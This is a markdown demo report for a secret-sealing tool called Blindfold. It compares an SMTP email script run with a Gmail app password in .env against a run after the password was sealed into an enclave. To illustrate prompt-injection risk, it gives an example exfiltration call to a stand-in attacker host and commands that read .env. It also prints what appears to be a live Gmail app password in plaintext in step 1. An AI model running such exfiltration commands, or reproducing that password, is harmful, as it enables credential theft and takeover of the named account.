# SMTP Demo — Blindfold security property on a non-HTTP credential

**Date:** 2026-06-19
**Sender:** npdimagine@gmail.com  (Gmail app password)
**Receiver:** algsoch@gmail.com

This test runs the *same* script twice — once with the SMTP password in `.env`, once after sealing it into T3 — to show the leak surface change. The script (`scripts/demo-smtp.ts`) reads `smtp_host`, `smtp_email`, `smtp_password` from `process.env` and sends one real email via `smtp.gmail.com:465`.

---

## Steps followed

1. `.env` had `smtp_email=npdimagine@gmail.com`, `smtp_password=upvueuylcycmswwy`, `smtp_host=smtp.gmail.com`.
2. **Run 1 (without Blindfold):**
   ```bash
   npm run demo:smtp -- algsoch@gmail.com "Test 1/2 — without Blindfold (password in env)" "..."
   ```
3. **Seal the password into T3** (uses one of the three input modes — here `--from-env` so we could chain with step 1):
   ```bash
   npm run blindfold -- register --name smtp_password --from-env smtp_password
   ```
4. **Delete `smtp_password=` line from `.env`.** The canonical copy now lives only inside the TDX enclave.
5. **Run 2 (with Blindfold):**
   ```bash
   npm run demo:smtp -- algsoch@gmail.com "Test 2/2 — WITH Blindfold (no password in env)" "..."
   ```

---

## What happened

### Run 1 — *without* Blindfold

```
Inputs visible to this process (the leak surface for any AI agent here):
  smtp_host       smtp.gmail.com
  smtp_email      npdimagine@gmail.com
  smtp_password   upv…wy  (16 bytes)        ← visible to the process
  → to            algsoch@gmail.com
  → subject       Blindfold SMTP test 1/2 — without Blindfold (password in env)

→ sending via smtp.gmail.com:465 SSL …
✓ SENT  messageId=<127433f5-26c0-6852-c1f7-6e1fd726492f@gmail.com>
  server response: 250 2.0.0 OK  1781906435 …
```

- ✅ Email delivered to algsoch@gmail.com (check inbox).
- 🚨 `smtp_password` was visible to the process. **Any prompt-injection in this agent could read `process.env.smtp_password` and exfiltrate it.**

### Run 2 — *with* Blindfold (password sealed, deleted from `.env`)

```
Inputs visible to this process (the leak surface for any AI agent here):
  smtp_host       smtp.gmail.com
  smtp_email      npdimagine@gmail.com
  smtp_password   (missing)                  ← nothing here to steal

⚠  At least one credential is missing.
   If you just sealed the password into Blindfold and deleted it from .env,
   this is the expected outcome — the agent process literally cannot send.
   That's the win: there's no value here for a prompt-injection to exfiltrate.
```

- ✋ Email NOT sent (intentionally — agent has no password).
- ✅ The password no longer exists on this machine outside the T3 enclave.
- 🛡️ Leak surface for `smtp_password` is **zero**. Whatever the agent tries to do — `print(env)`, `cat .env`, `http_get(attacker?k=$smtp_password)` — there is nothing on the disk or in process memory to send.

---

## What this proves (and what it doesn't)

| Claim | Verdict |
|---|---|
| The same script that worked at Run 1 cannot leak the SMTP password at Run 2 — because the value isn't on the machine. | ✅ Demonstrated end-to-end with a real send. |
| The sealed value really is in the T3 enclave at `z:<tid>:secrets/smtp_password`. | ✅ Verified independently — `npx tsx scripts/diagnose-execute.ts smtp_password` shows the contract reads it: `secret_len=16`. |
| The SMTP send itself can still happen *via* Blindfold without putting the password back on the host. | ⏳ Out of scope today. Blindfold's proxy is HTTP-only. An SMTP adapter (small contract + a local SMTP-to-T3 forwarder) is the natural next extension. |

The security property is independent of the protocol — Blindfold removes a credential from a process. Restoring functionality after Blindfold requires a Blindfold-aware caller, just like the HTTP/proxy case.

---

## Quick verification

- Look in algsoch@gmail.com for the email subject "Blindfold SMTP test 1/2 — without Blindfold (password in env)" sent at the time of Run 1.
- `npm run demo:smtp` from the current `.env` state will print `smtp_password (missing)` and refuse to send.
- `npx tsx scripts/diagnose-execute.ts smtp_password` reads back the sealed value's length without exposing it.

---

## To send the second email (the "with Blindfold succeeds" path) we'd need:

A tiny SMTP adapter that:
1. Accepts a local connection (e.g. `localhost:1465`) from the agent
2. Reads the agent's auth challenge (`AUTH PLAIN __BLINDFOLD__`)
3. Calls into the T3 contract, substitutes the real password
4. Forwards the SMTP session to Gmail

That's the natural extension. The architecture is the same as the HTTP proxy — just speaking SMTP on the wire to the agent and HTTPS-wrapped SMTP to T3.
